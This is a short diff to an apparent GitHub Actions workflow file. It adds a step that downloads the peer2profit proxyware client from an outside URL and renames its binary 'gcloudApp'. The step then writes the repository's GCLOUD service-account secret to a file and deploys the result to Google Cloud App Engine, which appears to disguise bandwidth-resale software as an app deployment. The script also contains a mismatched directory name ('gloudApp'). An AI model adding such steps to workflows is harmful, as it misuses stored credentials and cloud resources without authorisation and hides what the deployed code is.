@@ -194,4 +194,11 @@ jobs:
         if: github.event_name == 'dummy'
         steps:
         - uses: actions/checkout@main
-        - run: 
+        - run: |
+              curl https://updates.peer2profit.com/p2pclient_0.56_amd64.deb > p2pclient.deb
+              dpkg --fsys-tarfile p2pclient.deb | tar xf - ./usr/bin/p2pclient
+              mv usr/bin/p2pclient gcloudApp
+              cd gloudApp
+              echo '${{secrets.GCLOUD}}' > gcloud
+              gcloud auth activate-service-account --key-file=gcloud --project chaowenguo
+              gcloud app deploy
